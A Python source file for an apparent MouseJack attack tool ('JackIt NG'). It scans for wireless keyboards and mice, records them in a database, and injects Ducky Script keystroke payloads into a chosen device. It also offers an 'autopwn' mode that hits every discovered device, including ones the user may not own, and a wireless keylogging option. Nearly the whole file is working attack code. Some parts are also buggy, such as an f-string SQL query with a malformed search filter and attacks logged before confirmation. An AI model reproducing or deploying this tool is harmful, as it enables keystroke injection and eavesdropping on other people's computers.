# ==========================================================
# Root Check
# ==========================================================

def confirm_root():
    if hasattr(os, "getuid") and os.getuid() != 0:
        print("Must run as root.")
        sys.exit(1)


# ==========================================================
# Database Manager (Startup Initialization Only)
# ==========================================================

class JackItDatabase:

    def __init__(self):
        self.base_dir = Path.home() / ".jackit"
        self.db_path = self.base_dir / "jackit.db"
        self.conn = None

        self._initialize()

    # ------------------------------------------------------

    def _initialize(self):
        # Create directory only if missing
        if not self.base_dir.exists():
            self.base_dir.mkdir(parents=True, exist_ok=True)

        # Connect once
        self.conn = sqlite3.connect(self.db_path)

        # Create tables once
        self._create_tables()

    # ------------------------------------------------------

    def _create_tables(self):

        cursor = self.conn.cursor()

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS device (
                address TEXT PRIMARY KEY,
                channels TEXT,
                poll INT,
                first_seen TEXT,
                last_seen TEXT,
                model TEXT,
                packet TEXT,
                attack_count INT DEFAULT 0,
                excluded INT DEFAULT 0
            );
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS device_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                address TEXT,
                timestamp TEXT
            );
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS attack_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                address TEXT,
                payload TEXT,
                timestamp TEXT,
                result TEXT
            );
        """)

        self.conn.commit()

    # ------------------------------------------------------
    # Device Updates
    # ------------------------------------------------------

    def upsert_device(self, address, channels, poll, model, packet):

        now = datetime.utcnow().isoformat()

        cursor = self.conn.cursor()

        # Check if device exists
        cursor.execute(
            "SELECT first_seen FROM device WHERE address=?",
            (address,)
        )
        row = cursor.fetchone()

        if row:
            first_seen = row[0]
        else:
            first_seen = now

        cursor.execute("""
            INSERT OR REPLACE INTO device
            (address, channels, poll, first_seen, last_seen, model, packet, attack_count, excluded)
            VALUES (
                ?,
                ?,
                ?,
                ?,
                ?,
                ?,
                ?,
                COALESCE((SELECT attack_count FROM device WHERE address=?), 0),
                COALESCE((SELECT excluded FROM device WHERE address=?), 0)
            )
        """, (
            address,
            channels,
            poll,
            first_seen,
            now,
            model,
            packet,
            address,
            address
        ))

        self.conn.commit()

    # ------------------------------------------------------

    def log_device_event(self, address):
        now = datetime.utcnow().isoformat()
        cursor = self.conn.cursor()

        cursor.execute("""
            INSERT INTO device_history (address, timestamp)
            VALUES (?, ?)
        """, (address, now))

        self.conn.commit()

    # ------------------------------------------------------

    def log_attack(self, address, payload, result="OK"):
        now = datetime.utcnow().isoformat()
        cursor = self.conn.cursor()

        cursor.execute("""
            INSERT INTO attack_log (address, payload, timestamp, result)
            VALUES (?, ?, ?, ?)
        """, (address, payload, now, result))

        cursor.execute("""
            UPDATE device
            SET attack_count = attack_count + 1
            WHERE address=?
        """, (address,))

        self.conn.commit()

    # ------------------------------------------------------

    def toggle_exclude(self, address):
        cursor = self.conn.cursor()

        cursor.execute("""
            UPDATE device
            SET excluded = CASE excluded WHEN 1 THEN 0 ELSE 1 END
            WHERE address=?
        """, (address,))

        self.conn.commit()

    # ------------------------------------------------------

    def is_excluded(self, address):
        cursor = self.conn.cursor()

        cursor.execute("""
            SELECT excluded FROM device WHERE address=?
        """, (address,))

        row = cursor.fetchone()
        return row and row[0] == 1

    # ------------------------------------------------------

    def close(self):
        if self.conn:
            self.conn.close()


# ==========================================================
# Sort Menu Modal
# ==========================================================

class SortMenu(ModalScreen[str]):

    def compose(self) -> ComposeResult:
        yield Container(
            Static("Select column to sort by:\n"
                   "1 - ADDRESS\n"
                   "2 - CHANNELS\n"
                   "3 - COUNT\n"
                   "4 - LAST SEEN\n"
                   "5 - MODEL\n"
                   "6 - ATTACKS\n"
                   "7 - EXCLUDED\n\n"
                   "ESC - Cancel")
        )

    async def on_key(self, event):
        mapping = {
            "1": "address",
            "2": "channels",
            "3": "poll",
            "4": "last_seen",
            "5": "model",
            "6": "attack_count",
            "7": "excluded",
        }

        if event.key in mapping:
            self.dismiss(mapping[event.key])
        elif event.key == "escape":
            self.dismiss(None)


# ==========================================================
# Database Viewer Screen
# ==========================================================

class DatabaseScreen(Screen):

    DEFAULT_CSS = """
    Footer {
        dock: bottom;
    }
    """

    BINDINGS = [
        ("q", "close", "Back"),
        ("/", "search", "Search"),
        ("o", "sort_menu", "Sort"),
        ("x", "toggle_exclude", "Toggle Exclude"),
        ("delete", "delete_device", "Delete"),
        ("r", "refresh", "Refresh"),
    ]

    def __init__(self, db):
        super().__init__()
        self.db = db
        self.search_term = None
        self.sort_column = "last_seen"
        self.sort_desc = True

    def compose(self) -> ComposeResult:
        yield Header()
        yield Static("Database Viewer", id="status")
        yield DataTable(id="db-table")
        yield Footer()

    async def action_sort_menu(self):

        def handle_result(column):
            if not column:
                return

            if column == self.sort_column:
                self.sort_desc = not self.sort_desc
            else:
                self.sort_column = column
                self.sort_desc = True

            self.build_headers()
            self.load_data()

        await self.app.push_screen(SortMenu(), handle_result)


    async def on_data_table_header_selected(self, event: DataTable.HeaderSelected):

        column_index = event.column_index

        columns = [
            "address",
            "channels",
            "poll",
            "last_seen",
            "model",
            "attack_count",
            "excluded",
        ]

        selected_column = columns[column_index]

        if selected_column == self.sort_column:
            self.sort_desc = not self.sort_desc
        else:
            self.sort_column = selected_column
            self.sort_desc = True

        self.build_headers()
        self.load_data()


    async def on_mount(self):
        table = self.query_one(DataTable)

        self.build_headers()
        self.load_data()

    # ------------------------------------------------------

    def get_bindings(self):
        return self.BINDINGS

    def load_data(self):

        table = self.query_one(DataTable)

        # Save currently selected address (if any)
        selected_address = None
        if table.cursor_row is not None:
            try:
                selected_address = table.get_row_at(table.cursor_row)[0]
            except Exception:
                selected_address = None

        table.clear()

        cursor = self.db.conn.cursor()

        order = "DESC" if self.sort_desc else "ASC"
        if self.search_term:
            filter = "WHERE address LIKE ?",(f"%{self.search_term}%")
        else:
            filter = ""

        query = f"SELECT * FROM device {filter} ORDER BY {self.sort_column} {order}"
        cursor.execute(query)

        rows = cursor.fetchall()

        restore_index = None

        for idx, row in enumerate(rows):
            table.add_row(
                row[0],  # address
                row[1],  # channels
                str(row[2]),  # poll
                row[4],  # last_seen
                row[5],  # model
                str(row[7]),  # attack_count
                "YES" if row[8] else "NO"
            )

            # Remember row index if this was selected before
            if selected_address and row[0] == selected_address:
                restore_index = idx

        # Restore cursor position
        if restore_index is not None:
            table.cursor_coordinate = (restore_index, 0)

        # ------------------------------------------------------

    def build_headers(self):
        table = self.query_one(DataTable)

        # Clear existing columns safely
        table.clear(columns=True)

        columns = [
            ("address", "ADDRESS", 18),
            ("channels", "CHANNELS", 12),
            ("poll", "COUNT", 8),
            ("last_seen", "LAST SEEN", 22),
            ("model", "MODEL", 16),
            ("attack_count", "ATTACKS", 8),
            ("excluded", "EXC", 5),
        ]

        for key, label, width in columns:

            # Add sort indicator if this is active sort column
            if key == self.sort_column:
                arrow = "v" if self.sort_desc else "^"
                label = f"{label} {arrow}"

            table.add_column(label, width=width)


    async def action_search(self):

        def _set_search(value):
            self.search_term = value
            self.load_data()

        await self.app.push_screen(
            InputScreen("Search address (empty=all): "),
            _set_search
        )

    # ------------------------------------------------------

    async def action_toggle_exclude(self):
        table = self.query_one(DataTable)

        if table.cursor_row is None:
            return

        address = table.get_row_at(table.cursor_row)[0]

        self.db.toggle_exclude(address)
        self.load_data()

    # ------------------------------------------------------

    async def action_delete_device(self):
        table = self.query_one(DataTable)

        if table.cursor_row is None:
            return

        address = table.get_row_at(table.cursor_row)[0]

        cursor = self.db.conn.cursor()
        cursor.execute("DELETE FROM device WHERE address=?", (address,))
        cursor.execute("DELETE FROM device_history WHERE address=?", (address,))
        cursor.execute("DELETE FROM attack_log WHERE address=?", (address,))
        self.db.conn.commit()

        self.load_data()

    # ------------------------------------------------------

    async def action_refresh(self):
        self.load_data()

    def action_close(self):
        self.dismiss()

class InputScreen(ModalScreen[str]):

    def __init__(self, prompt):
        super().__init__()
        self.prompt = prompt

    def compose(self) -> ComposeResult:
        yield Container(
            Static(self.prompt),
            Input(placeholder="Enter value"),
        )

    async def on_input_submitted(self, event):
        self.dismiss(event.value)


# ==========================================================
# Confirmation Dialog
# ==========================================================

class ConfirmDialog(ModalScreen[bool]):

    CSS = """
    Screen {
        align: center middle;
    }

    #dialog {
        width: 60%;
        background: $surface;
        border: solid $accent;
        padding: 1 2;
    }

    #dialog-header {
        padding-left: 1;
        text-style: bold;
    }

    #dialog-header.danger {
        background: red;
        color: white;
    }

    #dialog-header.normal {
        background: $accent;
        color: $text;
    }

    #buttons {
        width: 100%;
        height: auto;
        align: center middle;
        padding-top: 1;
    }

    Button {
        margin: 0 3;
    }
    """


    BINDINGS = [
        ("enter", "confirm", "Confirm"),
        ("y", "confirm", "Confirm"),
        ("n", "cancel", "Cancel"),
        ("escape", "cancel", "Cancel"),
        ("tab", "next_button", "Next"),
        ("left", "prev_button", "Prev"),
        ("right", "next_button", "Next"),
    ]

    def __init__(self, title: str, message: str, danger: bool = False):
        super().__init__()
        self.title = title
        self.message = message
        self.danger = danger


    def compose(self) -> ComposeResult:

        header_classes = "danger" if self.danger else "normal"

        yield Container(
            Static(self.title, id="dialog-header", classes=header_classes),
            Static(self.message),
            Horizontal(
                Button("Continue", id="confirm"),
                Button("Cancel", id="cancel"),
                id="buttons",
            ),
            id="dialog",
        )


    # --------------------------------------------------
    # When dialog mounts → focus Continue by default
    # --------------------------------------------------

    async def on_mount(self):
        confirm_button = self.query_one("#confirm", Button)
        confirm_button.focus()

    # --------------------------------------------------
    # Button Click
    # --------------------------------------------------

    async def on_button_pressed(self, event: Button.Pressed):
        if event.button.id == "confirm":
            self.dismiss(True)
        else:
            self.dismiss(False)

    # --------------------------------------------------
    # Keyboard Actions
    # --------------------------------------------------

    def action_confirm(self):
        self.dismiss(True)

    def action_cancel(self):
        self.dismiss(False)

    def action_next_button(self):
        self._cycle_focus(forward=True)

    def action_prev_button(self):
        self._cycle_focus(forward=False)

    # --------------------------------------------------
    # Focus Cycling Logic
    # --------------------------------------------------

    def _cycle_focus(self, forward: bool):
        buttons = self.query(Button)
        buttons = list(buttons)

        if not buttons:
            return

        focused = self.focused

        if focused not in buttons:
            buttons[0].focus()
            return

        index = buttons.index(focused)

        if forward:
            index = (index + 1) % len(buttons)
        else:
            index = (index - 1) % len(buttons)

        buttons[index].focus()


# ==========================================================
# File Viewer
# ==========================================================

class FileViewer(ModalScreen[None]):

    CSS = """
        #viewer-header {
            height: 1;
            background: $accent;
            color: $text;
            padding-left: 1;
            text-style: bold;
        }
    """

    def __init__(self, path: str):
        super().__init__()
        self.path = path

    def compose(self) -> ComposeResult:
        yield Container(
            Static(f"Viewing: {self.path} (ESC to close)", id="viewer-header"),
            VerticalScroll(Static(self.read_file())),
        )

    def read_file(self) -> str:
        try:
            with open(self.path, "r", errors="ignore") as f:
                return f.read()
        except Exception:
            return "[Unable to read file]"

    async def on_key(self, event):
        if event.key == "escape":
            self.dismiss(None)


# ==========================================================
# Payload Browser
# ==========================================================

class PayloadBrowser(ModalScreen[Optional[str]]):

    def __init__(self, start_path="."):
        super().__init__()
        self.start_path = start_path

    def compose(self) -> ComposeResult:
        yield Container(
            Static("Browse Payload Files (ENTER=Select  v=View  ESC=Cancel)"),
            DirectoryTree(self.start_path),
        )

    async def on_directory_tree_file_selected(self, event: DirectoryTree.FileSelected):
        self.dismiss(event.path)

    async def on_key(self, event):
        if event.key == "escape":
            self.dismiss(None)

        elif event.key == "v":
            tree = self.query_one(DirectoryTree)
            node = tree.cursor_node
            if node and node.data:
                path = node.data.path
                if path and path.is_file():
                    await self.app.push_screen(FileViewer(str(path)))


# ==========================================================
# Main Application
# ==========================================================

class JackItNG(App):

    CSS = """
    #status {
        height: 1;
        background: $accent;
        color: $text;
        padding-left: 1;
        text-style: bold;
    }

    #device-summary {
        padding-left: 1;
    }
    """

    scanning = reactive(False)
    payload_name = reactive("None")

    BINDINGS = [
        ("s", "toggle_scan", "Scan"),
        ("p", "select_payload", "Payload"),
        ("v", "view_payload", "View Payload"),
        ("x", "toggle_exclude", "Exclude"),
        ("a", "attack_selected", "Attack selected"),
        ("A", "autopwn", "Autopwn"),
        ("D", "open_database", "Database"),
        ("q", "quit", "Quit"),
    ]

    def __init__(
        self,
        debug=False,
        interval=5,
        duration=5,
        layout="us",
        lowpower=False,
        reset=True,
        address="",
        vendor="",
        autopwn=False,
        all_channels=False,
    ):
        super().__init__()

        self.db = JackItDatabase()

        self.debug_mode = debug
        self.interval = interval
        self.duration = duration
        self.layout = layout
        self.attack = None
        self.scan_task: Optional[asyncio.Task] = None
        self.next_scan_time: Optional[float] = None
        self.payload_path: Optional[str] = None

        try:
            self.jack = mousejack.MouseJack(lowpower, debug, reset)
        except Exception as e:
            print(f"Radio init failed: {e}")
            sys.exit(1)

    # ------------------------------------------------------
    # UI Compose
    # ------------------------------------------------------

    def compose(self) -> ComposeResult:
        yield Header()
        yield Static("Idle | Payload: None", id="status")
        yield DataTable(id="devices")
        yield Static("", id="device-summary")
        yield Footer()

    async def on_mount(self):
        table = self.query_one(DataTable)

        col_key = table.add_column("KEY", width=4)
        table.add_column("ADDRESS", width=18)
        table.add_column("CHANNELS", width=9)
        col_count = table.add_column("COUNT", width=7)
        table.add_column("SEEN", width=13)
        table.add_column("TYPE", width=14)
        table.add_column("PACKET")

        col_key.justify = "right"
        col_count.justify = "right"

        self.set_interval(1.0, self.update_countdown)

        width = self.size.width
        fancy_line = "─" * (width - 1)
        summary = self.query_one("#device-summary", Static)
        summary.update(f"{fancy_line}\nDevices found: 0")

    async def on_shutdown(self):
        if hasattr(self, "db"):
            self.db.close()


    # ------------------------------------------------------
    # Countdown
    # ------------------------------------------------------

    async def update_countdown(self):
        if not self.scanning or not self.next_scan_time:
            return

        remaining = max(0, self.next_scan_time - time.time())
        status = self.query_one("#status", Static)

        status.update(
            f"SCANNING | RF: {self.duration}s | "
            f"Interval: {self.interval}s | "
            f"Next in: {remaining:.0f}s | "
            f"Payload: {self.payload_name}"
        )

    # ------------------------------------------------------
    # Scan Loop
    # ------------------------------------------------------

    async def scan_loop(self):
        while self.scanning:
            cycle_start = time.time()
            await asyncio.to_thread(self.jack.scan, self.duration)
            self.refresh_table()

            elapsed = time.time() - cycle_start
            remaining = self.interval - elapsed

            if remaining > 0:
                self.next_scan_time = time.time() + remaining
                try:
                    await asyncio.sleep(remaining)
                except asyncio.CancelledError:
                    break
            else:
                self.next_scan_time = None

    def refresh_table(self):
        table = self.query_one(DataTable)
        summary = self.query_one("#device-summary", Static)

        table.clear()
        now = time.time()

        for idx, (addr, device) in enumerate(self.jack.devices.items(), start=1):

            channels = ",".join(str(c) for c in device.get("channels", []))
            count = device.get("count", 0)

            timestamp = device.get("timestamp", now)
            delta = now - timestamp
            seen = time.strftime("%H:%M:%S", time.gmtime(delta)) + " ago"

            device_type = (
                device["device"].description()
                if device.get("device")
                else "Unknown"
            )

            packet = str(device.get("payload", ""))

            table.add_row(
                str(idx),
                addr,
                channels,
                str(count),
                seen,
                device_type,
                packet,
            )

            self.db.upsert_device(
                address=addr,
                channels=channels,
                poll=count,
                model=device_type,
                packet=str(packet),
            )

            self.db.log_device_event(addr)


        width = self.size.width
        fancy_line = "─" * (width - 1)
        summary.update(f"{fancy_line}\nDevices found: {len(self.jack.devices)}")

    async def action_open_database(self):
        if not hasattr(self, "db") or self.db is None:
            self.update_status("Database not initialized")
            return

        await self.push_screen(DatabaseScreen(self.db))

    async def action_toggle_exclude(self):
        table = self.query_one(DataTable)

        if table.cursor_row is None:
            return

        devices = list(self.jack.devices.items())
        row = table.cursor_row

        if row >= len(devices):
            return

        addr, _ = devices[row]

        self.db.toggle_exclude(addr)


    async def action_toggle_scan(self):
        self.scanning = not self.scanning

        if self.scanning:
            self.update_status()
            self.scan_task = asyncio.create_task(self.scan_loop())
        else:
            if self.scan_task:
                self.scan_task.cancel()
            self.update_status()

    # ------------------------------------------------------
    # Payload
    # ------------------------------------------------------

    async def action_select_payload(self):
        await self.push_screen(PayloadBrowser("."), self.on_payload_selected)

    async def on_payload_selected(self, path: Optional[str]):
        if path:
            self.load_payload(path)

    def load_payload(self, path, update_ui=True):
        try:
            with open(path, "r") as f:
                parser = duckyparser.DuckyParser(f.read(), layout=self.layout)
                self.attack = parser.parse()
                self.payload_name = os.path.basename(path)
                self.payload_path = path
                if update_ui:
                    self.update_status()
        except Exception:
            if update_ui:
                self.update_status()

    async def action_view_payload(self):
        if not self.payload_path:
            self.update_status()
            return
        await self.push_screen(FileViewer(self.payload_path))

    # ------------------------------------------------------
    # Attack (with Confirmation)
    # ------------------------------------------------------

    async def action_attack_selected(self):

        if not self.attack:
            self.update_status()
            return

        table = self.query_one(DataTable)

        if table.cursor_row is None:
            self.update_status()
            return

        devices = list(self.jack.devices.items())
        row_index = table.cursor_row

        if row_index >= len(devices):
            return

        addr, _ = devices[row_index]

        dialog = ConfirmDialog(
            "Confirm Attack",
            f"\nAttack selected device?\n\nAddress: {addr}\nPayload: {self.payload_name}",
        )

        await self.push_screen(dialog, self._on_attack_selected_confirmed)

        self.db.log_attack(addr, self.payload_name)


    async def _on_attack_selected_confirmed(self, confirmed: bool):

        if not confirmed:
            return

        table = self.query_one(DataTable)
        devices = list(self.jack.devices.items())
        row_index = table.cursor_row

        if row_index is None or row_index >= len(devices):
            return

        addr, device = devices[row_index]

        hid = device.get("device")
        if not hid:
            return

        payload = device["payload"]
        channels = device["channels"]
        address = device["address"]

        self.jack.sniffer_mode(address)
        lock_channel = self.jack.find_channel(address)

        if lock_channel:
            self.jack.attack(hid(address, payload), self.attack)
        else:
            for ch in channels:
                self.jack.set_channel(ch)
                self.jack.attack(hid(address, payload), self.attack)

        self.update_status()


    async def _perform_attack_selected(self):

        table = self.query_one(DataTable)
        devices = list(self.jack.devices.items())
        row_index = table.cursor_row
        addr, device = devices[row_index]

        hid = device.get("device")
        if not hid:
            return

        payload = device["payload"]
        channels = device["channels"]
        address = device["address"]

        self.jack.sniffer_mode(address)
        lock_channel = self.jack.find_channel(address)

        if lock_channel:
            self.jack.attack(hid(address, payload), self.attack)
        else:
            for ch in channels:
                self.jack.set_channel(ch)
                self.jack.attack(hid(address, payload), self.attack)

        self.update_status()

    async def action_autopwn(self):

        if not self.attack:
            self.update_status()
            return

        dialog = ConfirmDialog(
            "WARNING: AUTOPWN MODE",
            (
                "\n"
                "Autopwn will attempt to inject the loaded payload\n"
                "into ALL discovered injectable devices.\n\n"
                "This may affect devices you do NOT own.\n\n"
                "Proceed with extreme caution."
            ),
            danger=True,
        )

        await self.push_screen(dialog, self._on_autopwn_confirmed)

    async def _on_autopwn_confirmed(self, confirmed: bool):

        if not confirmed:
            return

        for addr, device in self.jack.devices.items():

            if self.db.is_excluded(addr):
                continue

            payload = device["payload"]
            channels = device["channels"]
            address = device["address"]
            hid = device["device"]

            if not hid:
                continue

            self.jack.sniffer_mode(address)
            lock_channel = self.jack.find_channel(address)

            if lock_channel:
                self.jack.attack(hid(address, payload), self.attack)
            else:
                for ch in channels:
                    self.jack.set_channel(ch)
                    self.jack.attack(hid(address, payload), self.attack)

        self.update_status()
        self.db.log_attack(addr, self.payload_name)




    # ------------------------------------------------------
    # Status
    # ------------------------------------------------------

    def update_status(self):
        status = self.query_one("#status", Static)

        if self.scanning:
            base = f"SCANNING | RF: {self.duration}s | Interval: {self.interval}s"
        else:
            base = f"Idle     | RF: {self.duration}s | Interval: {self.interval}s"

        base += f" | Payload: {self.payload_name}"

        status.update(base)


# ==========================================================
# CLI
# ==========================================================

@click.command()
@click.option("--debug", is_flag=True)
@click.option("--script", type=click.Path())
@click.option("--lowpower", is_flag=True)
@click.option("--interval", default=5, type=int)
@click.option("--duration", default=5, type=int)
@click.option("--layout", default="us")
@click.option("--address", default="")
@click.option("--vendor", default="")
@click.option("--reset", is_flag=True)
@click.option("--autopwn", is_flag=True)
@click.option("--all-channels", is_flag=True)
@click.option("--keylogging", is_flag=True)
def cli(debug, script, lowpower, interval, duration, layout, address, vendor, reset, autopwn, all_channels, keylogging):

    confirm_root()

    if keylogging:
        from jackit import keylogger
        jack = mousejack.MouseJack(lowpower, debug, True)
        k = keylogger.KeyLogger(jack, layout)
        k.scan()
        return

    app = JackItNG(
        debug=debug,
        interval=interval,
        duration=duration,
        layout=layout,
        lowpower=lowpower,
        reset=True,
        address=address,
        vendor=vendor,
        autopwn=autopwn,
        all_channels=all_channels,
    )

    if script:
        app.load_payload(script, update_ui=False)

    app.run()


if __name__ == "__main__":
    cli()

